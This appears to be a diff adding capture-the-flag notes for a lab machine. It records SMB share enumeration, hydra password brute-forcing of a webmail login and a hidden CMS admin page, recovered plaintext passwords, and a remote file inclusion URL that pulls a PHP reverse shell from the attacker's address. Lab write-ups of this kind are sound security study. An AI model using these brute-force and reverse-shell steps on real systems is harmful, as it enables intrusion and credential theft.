@@ -1,0 +1,44 @@
+attacker : 10.18.115.106
+target : 10.10.218.243
+
+445 Samba smbd 3.X - 4.X (scanner/smb/smb_enumshares):
+[*] 10.10.73.207:139      - Starting module
+[+] 10.10.73.207:139      - print$ - (DISK) Printer Drivers
+[+] 10.10.73.207:139      - anonymous - (DISK) Skynet Anonymous Share
+[+] 10.10.73.207:139      - milesdyson - (DISK) Miles Dyson Personal Share
+[+] 10.10.73.207:139      - IPC$ - (IPC|SPECIAL) IPC Service (skynet server (Samba, Ubuntu))
+[*] 10.10.73.207:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+smbclient //10.10.73.207/anonymous
+gobuster -u 10.10.73.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee dir_scan
+
+Mail:
+http://10.10.73.207/squirrelmail/src/login.php
+User: milesdyson
+hydra -vvv -l milesdyson -P 445/anonymous/log1.txt 10.10.73.207 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.' -I
+Pass: cyborg007haloterminator
+
+SMB password from mail:
+)s{A&2Z=F^n_E.B`
+smbclient -A auth.txt //10.10.73.207/milesdyson
+sudo mount -t cifs -o username='milesdyson',password=')s{A&2Z=F^n_E.B`',vers=2.0 //10.10.218.243/milesdyson mnt/
+
+HiddenCMS:
+10.10.218.243/45kra24zxs28v3yd
+gobuster -u 10.10.218.243/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee dir_scan_hiddencms
+10.10.218.243/45kra24zxs28v3yd/administrator
+hydra -V -l milesdyson -P 445/anonymous/log1.txt 10.10.218.243 http-post-form '/45kra24zxs28v3yd/administrator/:user=^USER^&password=^PASS^&task=login:F=Use a valid username and password to gain access to the administrator:H=Cookie\: PHPSESSID=ir5c979b63om60ncfffsr8ijt5' -I
+
+http://10.10.218.243/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.115.106/reverse_php.txt
+
+
+
+
+
+
+
+
+
+
+
